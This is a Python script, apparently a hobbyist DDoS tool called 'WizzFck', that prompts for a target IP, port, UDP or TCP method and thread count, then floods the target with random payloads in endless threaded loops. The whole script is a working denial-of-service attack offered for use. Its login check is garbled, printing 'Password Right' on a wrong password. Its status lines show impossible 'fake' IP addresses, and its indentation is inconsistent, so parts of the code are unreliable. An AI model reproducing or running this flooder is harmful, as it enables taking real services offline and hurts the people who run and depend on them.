import random
import socket
import threading
import os
import sys
import time

os.system("clear")
#login tools
password ="wizzfck"

print("""\u001b[34m
Login To Tools
""")
for i in range(3):
	pwd = input("\u001b[31m[+] Enter Password  : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[!] Check Password!!! ")
		break
	else:
		time.sleep(5)
		print("\u001b[31m[BOT]  Password Right!!! ")
		continue
time.sleep(5)
print("\u001b[35m[√] Successfully Loginned")
time.sleep(2)

os.system("clear")
print(" \033[95m WizzFck")
print("\033[0m")
print(""" \033[96m
▄▄▄█████▓  ██████ ▄▄▄█████▓
▓  ██▒ ▓▒▒██    ▒ ▓  ██▒ ▓▒
▒ ▓██░ ▒░░ ▓██▄   ▒ ▓██░ ▒░
░ ▓██▓ ░   ▒   ██▒░ ▓██▓ ░ 
  ▒██▒ ░ ▒██████▒▒  ▒██▒ ░ 
  ▒ ░░   ▒ ▒▓▒ ▒ ░  ▒ ░░   
    ░    ░ ░▒  ░ ░    ░    
  ░      ░  ░  ░    ░      
               ░           
                         
""")
print("\033[0m")


ip = str(input("\033[94m Host/Ip Target:"))
port = int(input("\033[0m\033[94m Port Target:"))
methods = str(input("\033[0m\033[94m Method | UDP / TCP |:"))
times = int(input("\033[0m\033[94m Paket :"))
threads = int(input("\033[0m\033[94m Threads:"))
fake_ip = '165.229.290.12'
fake_ip2 = '51.78.222.09'
fake_ip3 = '139.789.222.098'
os.system("clear")
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
#attacked
def run():
	data = random._urandom(2300)
	i = random.choice(("[BOT]","[BOT]","[BOT]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[94m TARGET IP:\033[0m%s\033[93m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s\033[96m PPS:\033[0m%s"%(ip,port,methods,threads,fake_ip))
		except:
			print(i +"\033[94m TARGET IP:\033[0m%s\033[93m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s\033[96m PPS:\033[0m%s"%(ip,port,methods,threads,fake_ip))

def run2():
	data = random._urandom(65535)
	i = random.choice(("[BOT]","[BOT]","[BOT]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[94m TARGET IP:\033[0m%s\033[93m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s\033[96m PPS:\033[0m%s"%(ip,port,methods,threads,fake_ip2))
		except:
			s.close()
			print(i +"\033[94m TARGET IP:\033[0m%s\033[93m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s\033[96m PPS:\033[0m%s"%(ip,port,methods,threads,fake_ip2))

def run3():
	data = random._urandom(65535)
	i = random.choice(("[BOT]","[BOT]","[BOT]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[94m TARGET IP:\033[0m%s\033[93m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s\033[96m PPS:\033[0m%s"%(ip,port,methods,threads,fake_ip3))
		except:
			s.close()
			print(i +"\033[94m TARGET IP:\033[0m%s\033[93m TARGET PORT:\033[0m%s \033[91mMETHODS:\033[0m%s \033[92mTHREADS:\033[0m%s\033[96m PPS:\033[0m%s"%(ip,port,methods,threads,fake_ip3))


for udp in range(threads):
	if methods == 'UDP':
		th = threading.Thread(target = run)
		th.start()
    else:
		th = threading.Thread(target = run2)
		th.start()   
 
for y in range(threads):
  if methods == 'TCP':
    th = threading.Thread(target = run3)
    th.start()